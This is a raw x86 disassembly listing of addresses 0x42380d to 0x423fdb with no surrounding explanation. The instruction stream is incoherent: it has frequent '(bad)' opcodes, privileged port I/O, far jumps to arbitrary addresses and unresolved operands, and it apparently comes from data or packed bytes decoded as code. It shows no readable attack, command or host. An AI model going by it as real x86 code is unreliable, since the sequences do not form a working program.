  42380d:	rcl    BYTE PTR [ecx-0x33893ae6],cl
  423813:	scas   eax,DWORD PTR es:[edi]
  423814:	loop   0x423805
  423816:	xchg   dh,dh
  423818:	mov    edi,0x6f1afc40
  42381d:	std    
  42381e:	and    cl,al
  423820:	mov    edi,0x254c93e5
  423825:	lock ja 0x423872
  423828:	jp     0x423849
  42382a:	(bad)  
  42382b:	cmp    DWORD PTR es:[edx+edi*8+0x239663bf],0xfcb2ba0e
  423837:	jecxz  0x423877
  423839:	shl    BYTE PTR [esi+0x31581481],0xa2
  423840:	clc    
  423841:	add    al,BYTE PTR [esi+0x5d]
  423844:	repnz stos DWORD PTR es:[edi],eax
  423846:	pop    ecx
  423847:	sbb    BYTE PTR [ecx+ecx*2+0x2],al
  42384b:	jecxz  0x4238b0
  42384d:	cld    
  42384e:	push   esi
  42384f:	test   BYTE PTR [edx+0x3d],cl
  423852:	repnz cdq 
  423854:	ret    
  423855:	repnz nop
  423857:	(bad)  
  423858:	retf   0x966c
  42385b:	test   al,0xa4
  42385d:	inc    ecx
  42385e:	jl     0x4238d4
  423860:	sub    bh,BYTE PTR [edx-0x219c1abb]
  423866:	fdiv   st(2),st
  423868:	inc    esi
  423869:	dec    ecx
  42386a:	outs   dx,DWORD PTR ds:[esi]
  42386b:	jg     0x423887
  42386d:	fsub   QWORD PTR [edi+ebx*8-0x70]
  423871:	in     al,dx
  423872:	sbb    BYTE PTR ds:0x8f69185a,dl
  423878:	shr    ah,1
  42387a:	mov    bh,0xdb
  42387c:	jb     0x4238bd
  42387e:	ss pop ebx
  423880:	xor    DWORD PTR [edi],edi
  423882:	out    dx,eax
  423883:	push   esp
  423884:	push   es
  423885:	adc    BYTE PTR gs:[esi+0x54],dh
  423889:	aas    
  42388a:	xor    eax,0x59cc7380
  42388f:	data16 sub al,0xef
  423892:	mov    al,ds:0x4336259f
  423898:	clc    
  423899:	(bad)  
  42389a:	push   eax
  42389b:	and    eax,0xea243392
  4238a0:	aad    0xbf
  4238a2:	outs   dx,BYTE PTR ds:[esi]
  4238a3:	mov    dl,0x9b
  4238a5:	js     0x423877
  4238a7:	mov    dh,BYTE PTR [ecx+0x195d01ef]
  4238ad:	add    dh,BYTE PTR [edi]
  4238af:	mov    ebp,ebx
  4238b1:	out    0x96,al
  4238b3:	fs pusha 
  4238b5:	mov    bh,ch
  4238b7:	cmp    dh,BYTE PTR [ecx]
  4238b9:	or     ch,BYTE PTR [ebp-0x48ca2ad2]
  4238bf:	stc    
  4238c0:	test   DWORD PTR gs:[bp+0x75],esp
  4238c5:	popf   
  4238c6:	(bad)  [ecx]
  4238c8:	mov    bl,0x32
  4238ca:	inc    ebx
  4238cb:	shl    DWORD PTR [eax+eax*2],0x6e
  4238cf:	pop    ss
  4238d0:	inc    ebx
  4238d1:	cmp    al,0x74
  4238d3:	jmp    0xcf65e455
  4238d8:	fbld   TBYTE PTR [ecx-0x6b17b06d]
  4238de:	push   edx
  4238df:	(bad)  [ebp+0x6be8e5d5]
  4238e5:	rcl    BYTE PTR [edi+0x338f59ac],0xe5
  4238ec:	in     al,dx
  4238ed:	int    0x92
  4238ef:	xor    eax,0xa23de00f
  4238f4:	adc    DWORD PTR [esi+0x49],0x34aa145e
  4238fb:	inc    esp
  4238fc:	lods   al,BYTE PTR ds:[esi]
  4238fd:	scas   al,BYTE PTR es:[edi]
  4238fe:	and    eax,0xdf4661cf
  423903:	shl    BYTE PTR [ecx],1
  423905:	pop    eax
  423906:	test   edi,edx
  423908:	and    al,0x30
  42390a:	mov    eax,0x6bfc2202
  42390f:	cmp    al,0xbf
  423911:	enter  0x693,0xd1
  423915:	mov    esp,0xc2724a71
  42391a:	mov    ebp,0x69153759
  42391f:	mov    ebp,0xf1618d4b
  423924:	aaa    
  423925:	inc    ebx
  423926:	sbb    DWORD PTR [ecx],esp
  423928:	xchg   BYTE PTR [eax-0x73],al
  42392b:	mov    esi,0x41ac21de
  423930:	(bad)  
  423931:	xchg   esp,eax
  423932:	pop    esi
  423933:	pop    edi
  423934:	inc    edi
  423935:	in     eax,dx
  423936:	int3   
  423937:	(bad)  
  423939:	jns    0x423917
  42393b:	lock sub ah,BYTE PTR [edi+ebp*2+0x68]
  423940:	jo     0x4239b3
  423942:	rcr    DWORD PTR [edi],1
  423944:	xor    dh,BYTE PTR [ebp+0x2a3da8e3]
  42394a:	add    DWORD PTR [ebp+0x512067d3],ebp
  423950:	xor    al,0xfb
  423952:	aas    
  423953:	mov    eax,0x831f57a1
  423958:	xchg   ecx,eax
  423959:	sbb    DWORD PTR [ecx+0x581535f6],esp
  42395f:	or     edi,ecx
  423961:	push   edi
  423962:	adc    edi,0x97c635e3
  423968:	inc    esi
  423969:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42396b:	retf   
  42396c:	and    DWORD PTR [ecx],eax
  42396e:	sub    eax,0x6f71c2f1
  423973:	sbb    ecx,ecx
  423975:	add    BYTE PTR [edi+0x85a4012],ah
  42397b:	shl    DWORD PTR [edi-0x55],1
  42397e:	cmp    ebp,DWORD PTR [ecx+0x1f190517]
  423984:	pop    es
  423985:	mov    dl,0x2a
  423987:	into   
  423988:	xchg   ecx,eax
  423989:	add    edx,edx
  42398b:	inc    esi
  42398c:	arpl   si,cx
  42398e:	xchg   esp,eax
  423990:	push   cs
  423991:	pop    edx
  423992:	sub    eax,0xa1989236
  423997:	mov    ds:0x269028e3,eax
  42399c:	cwde   
  42399d:	mov    cl,0xcb
  42399f:	push   cs
  4239a0:	call   0x9cec:0x8c6951e
  4239a7:	or     ebp,DWORD PTR [ecx-0x64f5a446]
  4239ad:	int3   
  4239ae:	ins    DWORD PTR es:[edi],dx
  4239af:	leave  
  4239b0:	sbb    edx,DWORD PTR [ebx+0x3c]
  4239b3:	xor    BYTE PTR [ebx+edi*2],ch
  4239b6:	lods   al,BYTE PTR ds:[esi]
  4239b7:	mov    bl,0xe4
  4239b9:	outs   dx,BYTE PTR ds:[esi]
  4239ba:	inc    ebx
  4239bb:	lods   al,BYTE PTR ds:[esi]
  4239bc:	loope  0x423942
  4239be:	inc    ebx
  4239bf:	popa   
  4239c0:	mov    cl,ch
  4239c2:	pop    ecx
  4239c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4239c4:	cmp    dl,BYTE PTR [edi+edi*1-0x77]
  4239c8:	lods   eax,DWORD PTR ds:[esi]
  4239c9:	neg    DWORD PTR [edi*4-0x2f8bf3c1]
  4239d0:	inc    ecx
  4239d1:	mov    dh,0x4a
  4239d3:	daa    
  4239d4:	cdq    
  4239d5:	and    al,0xa9
  4239d7:	cmp    eax,esp
  4239d9:	(bad)  
  4239da:	push   edi
  4239db:	loopne 0x4239ac
  4239dd:	int    0x9a
  4239df:	(bad)  
  4239e0:	or     eax,0x34a7f6ab
  4239e5:	(bad)  
  4239e6:	sub    DWORD PTR [edx-0x7],edi
  4239e9:	sub    bl,BYTE PTR [esi-0x2f]
  4239ec:	sbb    BYTE PTR cs:[ebp+0x20],0xd3
  4239f1:	adc    eax,0x3a6a6cad
  4239f6:	push   edi
  4239f7:	mov    DWORD PTR [edi-0x59],ebx
  4239fa:	sub    edx,ebp
  4239fc:	add    eax,0x875440f9
  423a01:	fs push 0x76
  423a04:	aas    
  423a05:	cmp    dl,BYTE PTR [esi+ebx*8-0x38]
  423a09:	pushf  
  423a0a:	mov    dh,BYTE PTR [edx]
  423a0c:	dec    esp
  423a0d:	aas    
  423a0e:	ins    DWORD PTR es:[edi],dx
  423a0f:	retf   0x13c2
  423a12:	dec    ebp
  423a13:	adc    DWORD PTR [edx+0x7c8ad7df],0xffffffc2
  423a1a:	sbb    eax,0xa0a9e6cc
  423a1f:	and    al,dl
  423a21:	and    BYTE PTR [eax],dh
  423a23:	repnz or al,0xba
  423a26:	aas    
  423a27:	imul   esp,DWORD PTR [ecx+0x6723206f],0x8e529837
  423a31:	ror    dl,1
  423a33:	add    ch,ch
  423a35:	add    eax,0x8b7c3756
  423a3a:	test   DWORD PTR [esi],ebx
  423a3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423a3d:	sti    
  423a3e:	mov    dl,0xe3
  423a40:	xor    DWORD PTR [eax+ebx*8+0x45d115b2],ecx
  423a47:	rcr    DWORD PTR [eax],cl
  423a49:	sar    dl,cl
  423a4b:	push   0xffffffc9
  423a4d:	mov    dh,0xea
  423a4f:	data16 (bad) 
  423a51:	fdivr  st(7),st
  423a53:	sub    eax,0xfd35dd09
  423a58:	syscall 
  423a5a:	sbb    ebx,DWORD PTR [ebp-0x59ee29d9]
  423a60:	add    cl,al
  423a62:	loop   0x423a16
  423a64:	mov    al,ds:0x18e41ca
  423a69:	fcom   QWORD PTR [edx]
  423a6b:	or     DWORD PTR [ebx+0x3f40c425],edx
  423a71:	out    0x6,eax
  423a73:	ins    DWORD PTR es:[edi],dx
  423a74:	jge    0x423a7a
  423a76:	aam    0xa1
  423a78:	out    dx,eax
  423a79:	sub    esi,DWORD PTR [ebx-0x1262e4de]
  423a7f:	shr    DWORD PTR [esp+edx*8-0x6e1364b],0xe1
  423a87:	push   ebx
  423a88:	sub    eax,0x228f03
  423a8d:	mov    ebp,0x27aadb4
  423a92:	adc    BYTE PTR [ebp+0x5d077743],bl
  423a98:	adc    BYTE PTR [esi+esi*8+0x52],ch
  423a9c:	jmp    0x423b0e
  423a9e:	xor    DWORD PTR [ecx],esp
  423aa0:	fcomip st,st(2)
  423aa2:	popf   
  423aa3:	inc    ebx
  423aa4:	jp     0x423a33
  423aa6:	call   0x7db0f181
  423aab:	test   bh,bh
  423aad:	mov    ebx,0xf57fd6eb
  423ab2:	xlat   BYTE PTR ds:[ebx]
  423ab3:	jns    0x423ae9
  423ab5:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  423ab7:	imul   edx,DWORD PTR [ebx+0x49ede878],0xbecbedfb
  423ac1:	pusha  
  423ac2:	out    dx,al
  423ac3:	inc    ecx
  423ac4:	dec    esi
  423ac5:	fistp  DWORD PTR [ebp-0x50]
  423ac8:	call   FWORD PTR [edx]
  423aca:	scas   al,BYTE PTR es:[edi]
  423acb:	pop    ss
  423acc:	sub    edi,edx
  423ace:	and    BYTE PTR [esi+0x3a],dl
  423ad1:	pushf  
  423ad2:	adc    eax,0x7c19fdb1
  423ad7:	jnp    0x423a6d
  423ad9:	pop    es
  423ada:	rcl    BYTE PTR [ebp+0x4f7e9a40],1
  423ae0:	mov    ebp,0x5ae3197f
  423ae5:	mov    eax,0xd40c459b
  423aea:	lods   eax,DWORD PTR ds:[esi]
  423aeb:	mov    ?,esi
  423aed:	jle    0x423abf
  423aef:	mov    edx,0x37b9a234
  423af4:	retf   0x3227
  423af7:	dec    ebp
  423af8:	(bad)  [ecx]
  423afa:	ds call 0xb7e67e36
  423b00:	sub    BYTE PTR [ecx+0x18],dh
  423b03:	mov    eax,0xf3c466a8
  423b08:	cmp    al,BYTE PTR [edi+0x30a5e380]
  423b0e:	push   cs
  423b0f:	aad    0x19
  423b11:	jle    0x423b02
  423b13:	xchg   ebx,eax
  423b14:	in     al,dx
  423b15:	inc    ebp
  423b16:	leave  
  423b17:	inc    esp
  423b18:	ins    DWORD PTR es:[edi],dx
  423b19:	sahf   
  423b1a:	xchg   edi,eax
  423b1b:	mov    ds:0x66920ffb,eax
  423b20:	mov    ebp,0x122363ff
  423b25:	es push esi
  423b27:	adc    esp,eax
  423b29:	jle    0x423acd
  423b2b:	rcr    esp,1
  423b2d:	out    0xa4,al
  423b2f:	xor    edi,DWORD PTR [ebp+0x340a5865]
  423b35:	inc    ebp
  423b36:	or     bl,BYTE PTR [ecx-0x13cb1f5d]
  423b3c:	xchg   DWORD PTR [esi+0x5c],ebx
  423b3f:	lods   eax,DWORD PTR ds:[esi]
  423b40:	into   
  423b41:	lea    eax,[ebp-0x661eff7e]
  423b47:	dec    ecx
  423b48:	ja     0x423b74
  423b4a:	sub    DWORD PTR [eax+eiz*2-0xa],ecx
  423b4e:	mov    eax,ds:0x4dcfe3fa
  423b53:	jb     0x423b2e
  423b55:	cmp    DWORD PTR [ebx],edi
  423b57:	xchg   ebp,eax
  423b58:	cdq    
  423b59:	cmp    ecx,ebx
  423b5b:	aad    0x61
  423b5d:	loope  0x423ba6
  423b5f:	rcl    BYTE PTR [edi+0x3160acfc],1
  423b65:	ja     0x423b0d
  423b67:	icebp  
  423b68:	dec    edx
  423b69:	jmp    0x423b20
  423b6b:	sbb    DWORD PTR [ebx],edi
  423b6d:	push   esp
  423b6e:	popf   
  423b6f:	sti    
  423b70:	pop    ebp
  423b71:	cs pop esi
  423b73:	mov    edx,0xd50cd58e
  423b78:	icebp  
  423b79:	js     0x423b3e
  423b7b:	mov    al,0x8a
  423b7d:	lds    edx,FWORD PTR [edi]
  423b7f:	pop    ds
  423b80:	mov    al,ds:0xa50c0c44
  423b85:	or     BYTE PTR [ebx+eax*1-0x18356a59],dh
  423b8c:	inc    edi
  423b8d:	lock cld 
  423b8f:	cli    
  423b90:	mov    ebp,gs
  423b92:	xor    eax,0x8820da8
  423b97:	push   ebp
  423b98:	shl    BYTE PTR [eax-0xe],cl
  423b9b:	or     al,0xc
  423b9d:	jae    0x423b26
  423b9f:	xchg   ebp,eax
  423ba0:	sbb    BYTE PTR [ecx+0x73],ah
  423ba3:	push   edi
  423ba4:	inc    edx
  423ba5:	inc    eax
  423ba6:	sub    eax,0x400bb789
  423bab:	out    0xec,eax
  423bad:	arpl   WORD PTR [ebx-0x1452ddf7],bp
  423bb3:	jae    0x423bee
  423bb5:	push   edx
  423bb6:	or     DWORD PTR [eax+0x75],ebp
  423bb9:	cmp    eax,eax
  423bbb:	(bad)  
  423bbc:	push   0xffffffaf
  423bbe:	arpl   WORD PTR [edx+eax*8],si
  423bc1:	retf   0x2014
  423bc4:	mov    esi,0x81c7bb60
  423bc9:	and    edx,DWORD PTR [eax-0x1c]
  423bcc:	clc    
  423bcd:	popf   
  423bce:	js     0x423c24
  423bd0:	sub    DWORD PTR [ebp+0x4bbac901],edi
  423bd6:	mov    ds:0xa2f1d662,eax
  423bdb:	pop    ss
  423bdc:	fist   DWORD PTR [esi-0x6113216e]
  423be2:	jo     0x423bdf
  423be4:	icebp  
  423be5:	mov    BYTE PTR [edx-0x1d],al
  423be8:	sub    eax,DWORD PTR [ebp+ebp*4-0x36381998]
  423bef:	pop    ds
  423bf0:	mov    al,BYTE PTR [edi-0x52]
  423bf3:	shr    eax,1
  423bf5:	jns    0x423c2a
  423bf7:	pop    edi
  423bf8:	pusha  
  423bf9:	sbb    BYTE PTR [esp+eiz*8],dl
  423bfc:	mov    ebx,0xe829b753
  423c01:	adc    bl,BYTE PTR [ecx+0x1ed6d9f9]
  423c07:	pop    esp
  423c08:	seta   BYTE PTR [edi+esi*4]
  423c0c:	mov    ds:0xacc44945,eax
  423c11:	xlat   BYTE PTR ds:[ebx]
  423c12:	les    ebp,FWORD PTR [ecx-0x63913033]
  423c18:	sbb    DWORD PTR ds:[ebx-0x328cf399],0xb
  423c20:	imul   ebp,DWORD PTR [ecx-0x33],0x4c8cff45
  423c27:	sahf   
  423c28:	jmp    0x423c3f
  423c2a:	pop    edi
  423c2b:	xlat   BYTE PTR ds:[ebx]
  423c2c:	mov    ecx,0x9cea90c6
  423c31:	mov    al,ds:0x4582bc79
  423c36:	mov    ds:0x5220e433,al
  423c3b:	mov    ds:0x14de6558,al
  423c40:	jns    0x423c1a
  423c42:	fidivr WORD PTR [edx+0x3c571cc4]
  423c48:	sub    dl,bl
  423c4a:	push   eax
  423c4b:	push   ds
  423c4c:	in     al,0x9
  423c4e:	mov    ebp,0xb90d5876
  423c53:	(bad)  
  423c54:	and    DWORD PTR [edx],0xffffff8a
  423c57:	pop    ebx
  423c58:	(bad)  
  423c59:	popa   
  423c5a:	jno    0x423bfd
  423c5c:	sbb    ebx,ebp
  423c5e:	les    ebp,FWORD PTR [ebx]
  423c60:	gs mov ecx,0x9e7d539
  423c66:	pop    ebx
  423c67:	xchg   edx,eax
  423c68:	leave  
  423c69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423c6a:	cmp    BYTE PTR [eax+0x7973524e],ch
  423c70:	mov    bl,0x1a
  423c72:	sub    eax,0xbda57fbf
  423c77:	sbb    al,dl
  423c79:	jne    0x423c77
  423c7b:	or     ebx,DWORD PTR [ebp+0x1e]
  423c7e:	(bad)  
  423c7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423c80:	xlat   BYTE PTR fs:[ebx]
  423c82:	and    DWORD PTR [ebx+eax*2+0x2a],edi
  423c86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423c87:	pusha  
  423c88:	xor    ch,dh
  423c8a:	xor    ebp,DWORD PTR [ecx+0x53]
  423c8d:	pop    ecx
  423c8e:	daa    
  423c8f:	nop
  423c90:	mov    bl,0x41
  423c92:	inc    eax
  423c93:	dec    edx
  423c94:	repnz xchg ecx,eax
  423c96:	jp     0x423c5b
  423c98:	(bad)  
  423c99:	shr    DWORD PTR [esi],0xaf
  423c9c:	rcl    BYTE PTR [edx+0x1cbd4e47],cl
  423ca2:	mov    ebp,?
  423ca4:	dec    eax
  423ca6:	jmp    DWORD PTR [eax-0x79e6bc61]
  423cac:	das    
  423cad:	push   es
  423cae:	inc    edx
  423caf:	sub    BYTE PTR [ebx],bh
  423cb1:	mov    esp,edx
  423cb3:	pop    esi
  423cb4:	adc    esi,ecx
  423cb6:	xchg   esi,eax
  423cb7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423cb8:	bound  edi,QWORD PTR [edx-0x78fd4eb9]
  423cbe:	pop    esp
  423cbf:	aam    0x94
  423cc1:	pop    ecx
  423cc2:	adc    al,0x8e
  423cc4:	ja     0x423caf
  423cc6:	rcr    cl,0xf0
  423cc9:	daa    
  423cca:	(bad)  
  423ccb:	push   ss
  423ccc:	jmp    0xe0eb398d
  423cd1:	fist   DWORD PTR [eax-0x6f06a270]
  423cd8:	neg    bl
  423cda:	fst    st(2)
  423cdc:	or     eax,0x53e5eef1
  423ce1:	imul   ebx,DWORD PTR [edx-0x669cb10d],0x2
  423ce8:	jb     0x423d1a
  423cea:	pop    edi
  423ceb:	je     0x423d40
  423ced:	mov    ch,0xe3
  423cef:	inc    eax
  423cf0:	sub    ebx,DWORD PTR [esi+0x759e13e8]
  423cf6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423cf7:	cli    
  423cf8:	(bad)  
  423cf9:	xor    al,0xdb
  423cfb:	and    al,0x76
  423cfd:	fs aaa 
  423cff:	or     DWORD PTR [esi],ecx
  423d01:	mov    al,ds:0xcb9b6dcf
  423d06:	inc    esi
  423d07:	pop    esi
  423d08:	pusha  
  423d09:	(bad)  
  423d0a:	into   
  423d0b:	cs das 
  423d0d:	jp     0x423d48
  423d0f:	das    
  423d10:	jb     0x423cb4
  423d12:	shl    BYTE PTR [eax-0x67],cl
  423d15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423d16:	pop    ebp
  423d17:	nop
  423d18:	fisubr DWORD PTR [esi+0x602e5894]
	...
  423d2a:	inc    esp
  423d2b:	push   edx
  423d2c:	push   edi
  423d2d:	push   ebp
  423d2e:	push   edi
  423d2f:	push   ebp
  423d30:	inc    esi
  423d31:	push   ebx
  423d32:	test   BYTE PTR [eax-0x33830192],ah
  423d38:	pop    ecx
  423d39:	mov    edx,0x1cb20
  423d3e:	jl     0x423d46
  423d40:	add    BYTE PTR [eax],al
  423d42:	gs mov al,0xfd
  423d45:	das    
  423d46:	arpl   WORD PTR [ebx+0x6df02b09],si
  423d4c:	xor    BYTE PTR [eax-0x7ad7ba9a],bl
  423d52:	jne    0x423d7e
  423d54:	sub    al,0x1b
  423d56:	out    dx,eax
  423d57:	ret    
  423d58:	shl    DWORD PTR [ebp-0x4a61cd2f],0x66
  423d5f:	in     eax,dx
  423d60:	jbe    0x423d7d
  423d62:	jmp    0x4fdae6f3
  423d67:	std    
  423d68:	adc    ebx,esp
  423d6a:	inc    edi
  423d6b:	in     eax,dx
  423d6c:	jmp    0x6f3f3c64
  423d71:	pop    esi
  423d72:	mov    esi,?
  423d74:	aas    
  423d75:	adc    DWORD PTR [ecx],0x6c
  423d78:	pop    es
  423d79:	pop    eax
  423d7a:	xchg   esi,eax
  423d7b:	cmp    al,0x3e
  423d7d:	out    dx,eax
  423d7e:	les    eax,FWORD PTR [ebx+0xcdcb4a4]
  423d84:	shr    edx,cl
  423d86:	pop    edx
  423d87:	mov    DWORD PTR [esi-0x31],ecx
  423d8a:	push   ebx
  423d8b:	or     cl,al
  423d8d:	sub    esi,edi
  423d8f:	and    BYTE PTR [edi],bl
  423d91:	mov    dl,cl
  423d93:	pop    ecx
  423d94:	clc    
  423d95:	xchg   DWORD PTR [ebx-0x370f0089],ebp
  423d9b:	mov    edx,0x5bd808d3
  423da0:	call   FWORD PTR [esi]
  423da2:	outs   dx,BYTE PTR ds:[esi]
  423da3:	popf   
  423da4:	dec    esp
  423da5:	addr16 popa 
  423da7:	or     ebx,ebp
  423da9:	test   al,0x55
  423dab:	sub    ch,BYTE PTR [ebp+0x58267f72]
  423db1:	imul   esi,DWORD PTR [ebp-0x770d9690],0x28
  423db8:	pop    esi
  423db9:	sub    ebp,DWORD PTR [ecx+ecx*8+0x4c]
  423dbd:	sbb    eax,0x9beb436
  423dc2:	das    
  423dc3:	xchg   BYTE PTR [ecx-0x67],ch
  423dc6:	ja     0x423d93
  423dc8:	dec    esp
  423dc9:	shr    ch,cl
  423dcb:	dec    edx
  423dcc:	jmp    0xcbb7:0xffd85d6f
  423dd3:	js     0x423de8
  423dd5:	mov    ebp,0xe31e0c8a
  423dda:	xor    al,0x89
  423ddc:	xchg   DWORD PTR [ebx-0x4e],edi
  423ddf:	jmp    0x423dfc
  423de1:	adc    eax,0x89a458ef
  423de6:	xchg   ecx,eax
  423de7:	fld    DWORD PTR [eax+0x3dbd2384]
  423ded:	test   DWORD PTR [edi-0xfcc1c65],ebp
  423df3:	in     eax,dx
  423df4:	xchg   esp,eax
  423df5:	mov    edx,0x32d301a6
  423dfa:	leave  
  423dfb:	or     al,0xcb
  423dfd:	es jno 0x423dd1
  423e00:	xchg   DWORD PTR [eax-0x2c],esp
  423e03:	fbld   TBYTE PTR [edx+0x1e]
  423e06:	fisttp DWORD PTR [edx]
  423e08:	or     al,0x9f
  423e0a:	sub    DWORD PTR [ecx+0x69ad624d],edx
  423e10:	cmp    dh,BYTE PTR ds:0x827ae956
  423e16:	test   BYTE PTR [ecx+ebx*8],cl
  423e19:	leave  
  423e1a:	push   edi
  423e1b:	lods   eax,DWORD PTR ds:[esi]
  423e1c:	std    
  423e1d:	icebp  
  423e1e:	inc    ebx
  423e1f:	push   edi
  423e20:	xor    al,0x11
  423e22:	aas    
  423e23:	sbb    al,0xc8
  423e25:	jl     0x423dd4
  423e27:	int    0x55
  423e29:	push   0xffffff80
  423e2b:	lods   eax,DWORD PTR ds:[esi]
  423e2c:	push   0x525819f2
  423e31:	(bad)  
  423e32:	out    dx,eax
  423e33:	(bad)  
  423e34:	push   edx
  423e35:	lahf   
  423e36:	cmp    al,0xbe
  423e38:	pop    edi
  423e39:	neg    DWORD PTR [edx+0x7267ff5e]
  423e3f:	aad    0x4c
  423e41:	es xchg edi,eax
  423e43:	test   eax,0x6ab5df4c
  423e48:	addr16 jbe 0x423dd9
  423e4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423e4c:	jp     0x423e52
  423e4e:	shr    DWORD PTR [esi-0x1d4be333],cl
  423e54:	fsub   DWORD PTR ds:0x3843e14
  423e5a:	jg     0x423e03
  423e5c:	sbb    ebx,ebx
  423e5e:	(bad)  
  423e5f:	das    
  423e60:	aam    0x4c
  423e62:	dec    esp
  423e63:	stos   BYTE PTR es:[edi],al
  423e64:	push   cs
  423e65:	sub    ecx,DWORD PTR [edi-0x33]
  423e68:	xchg   BYTE PTR [edx-0x7a],dh
  423e6b:	bound  eax,QWORD PTR [edi+ebx*2]
  423e6e:	mov    dl,0xd9
  423e70:	dec    esp
  423e71:	pop    esp
  423e72:	ins    BYTE PTR es:[edi],dx
  423e73:	repz mov esp,0xfb697e8c
  423e79:	shl    DWORD PTR [ebp-0x7e],1
  423e7c:	push   es
  423e7d:	adc    dl,BYTE PTR ds:0x8bfd7c
  423e83:	xchg   esp,eax
  423e84:	adc    edi,DWORD PTR ss:[edi]
  423e87:	xor    al,BYTE PTR [eax+0x40]
  423e8a:	test   eax,esi
  423e8c:	jle    0x423eef
  423e8e:	ja     0x423e3c
  423e90:	xchg   esp,eax
  423e91:	pop    edx
  423e92:	gs jnp 0x423e28
  423e95:	xchg   ecx,eax
  423e96:	jmp    0x423ee9
  423e98:	push   ss
  423e99:	bound  esp,QWORD PTR [edx]
  423e9b:	sbb    BYTE PTR [eax+0x5a846d46],bh
  423ea1:	pusha  
  423ea2:	push   ds
  423ea3:	jmp    0x371d:0xb212d5aa
  423eaa:	stc    
  423eab:	test   eax,0x65a9d5b8
  423eb0:	dec    edi
  423eb1:	inc    esi
  423eb2:	push   ebx
  423eb3:	pop    ss
  423eb4:	shl    edx,0xaf
  423eb7:	ss cwde 
  423eb9:	into   
  423eba:	xor    bl,al
  423ebc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423ebd:	jle    0x423ebe
  423ebf:	cmp    dh,BYTE PTR [edi+0x419a2e3d]
  423ec5:	shl    BYTE PTR [ecx+eax*8+0xc509891],1
  423ecc:	icebp  
  423ecd:	sub    al,0x95
  423ecf:	(bad)  
  423ed0:	ja     0x423ec9
  423ed2:	or     esp,DWORD PTR [edx+0x73568664]
  423ed8:	je     0x423f0c
  423eda:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423edb:	xor    edi,DWORD PTR [ecx]
  423edd:	xchg   eax,ebx
  423edf:	popa   
  423ee0:	mov    dl,0xb3
  423ee2:	shl    BYTE PTR [esi+0x331cfdb2],cl
  423ee8:	jbe    0x423eb6
  423eea:	xor    DWORD PTR [edx+0x292b4dab],ebp
  423ef0:	jbe    0x423f07
  423ef2:	lds    ecx,FWORD PTR [edx+eax*8]
  423ef5:	les    edi,FWORD PTR [esi+0x4b]
  423ef8:	iret   
  423ef9:	stc    
  423efa:	inc    ecx
  423efb:	sahf   
  423efc:	cmp    BYTE PTR ds:0xc9a063b,ch
  423f02:	stc    
  423f03:	mov    cl,BYTE PTR [eax+0x69]
  423f06:	popf   
  423f07:	fsub   DWORD PTR [eax]
  423f09:	fs push eax
  423f0b:	cmc    
  423f0c:	je     0x423f00
  423f0e:	mov    cl,0xb
  423f10:	mov    ah,ah
  423f12:	sub    al,0x1a
  423f14:	xlat   BYTE PTR ds:[ebx]
  423f15:	in     eax,dx
  423f16:	jnp    0x423ea7
  423f18:	cld    
  423f19:	pop    esp
  423f1a:	cmp    BYTE PTR [esi-0x3c],al
  423f1d:	mov    dl,0x5
  423f1f:	lds    ecx,FWORD PTR [ebp+0x12]
  423f22:	push   ds
  423f23:	int    0xf3
  423f25:	xor    ah,BYTE PTR [ecx]
  423f27:	fnsave ds:0x3acab7a8
  423f2d:	xchg   bh,bl
  423f2f:	mov    eax,fs:0x3073a1a
  423f35:	sub    al,BYTE PTR [edi]
  423f37:	pop    ds
  423f38:	sbb    edi,DWORD PTR ds:[ebx+0x48]
  423f3c:	inc    edi
  423f3d:	push   eax
  423f3e:	mov    eax,esi
  423f40:	sar    ecx,0xc9
  423f43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423f44:	jle    0x423f1e
  423f46:	sub    DWORD PTR [eax],esi
  423f48:	or     bh,0x7b
  423f4b:	fs aaa 
  423f4d:	pop    ebx
  423f4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423f50:	les    eax,FWORD PTR [edi]
  423f52:	fst    DWORD PTR [edx]
  423f54:	inc    esp
  423f55:	popf   
  423f56:	xchg   sp,ax
  423f58:	mov    ch,0xf8
  423f5a:	xchg   BYTE PTR [eax-0x3bccdf61],ch
  423f60:	mov    ds:0x47cc8da5,eax
  423f65:	pop    esp
  423f66:	std    
  423f67:	push   0xffffffc7
  423f69:	xchg   DWORD PTR [ebx],ecx
  423f6b:	in     eax,0x24
  423f6d:	jg     0xeba17c61
  423f73:	outs   dx,DWORD PTR ds:[esi]
  423f74:	loopne 0x423f73
  423f76:	call   0xbb7b:0xd0b30213
  423f7d:	inc    edi
  423f7e:	inc    ecx
  423f7f:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  423f81:	push   DWORD PTR [edi+0x6e880751]
  423f87:	jl     0x423f45
  423f89:	inc    eax
  423f8a:	push   0xea90b7e1
  423f8f:	fisttp DWORD PTR [ecx+ebp*1-0x13dc46f8]
  423f96:	sbb    ch,BYTE PTR [ebp-0x7f575509]
  423f9c:	int    0x5f
  423f9e:	push   ebp
  423f9f:	or     eax,0x774a1bd7
  423fa4:	fwait
  423fa5:	inc    esp
  423fa6:	mov    eax,ds:0x1d64aad0
  423fab:	loopne 0x424028
  423fad:	cmp    eax,0x22308e6b
  423fb2:	cmp    DWORD PTR [eax-0x1188d065],esp
  423fb8:	jg     0x424032
  423fba:	push   esi
  423fbb:	mov    edi,0xcd77e28c
  423fc0:	das    
  423fc1:	sub    BYTE PTR [ecx-0x555e7c4b],0xe
  423fc8:	call   0xce2b487f
  423fcd:	mov    al,ds:0xa32b0597
  423fd2:	dec    ecx
  423fd3:	fwait
  423fd4:	out    dx,eax
  423fd5:	dec    ecx
  423fd6:	(bad)  
  423fd7:	jns    0x423f61
  423fd9:	iret   
  423fda:	pop    esi
  423fdb:	inc    eax
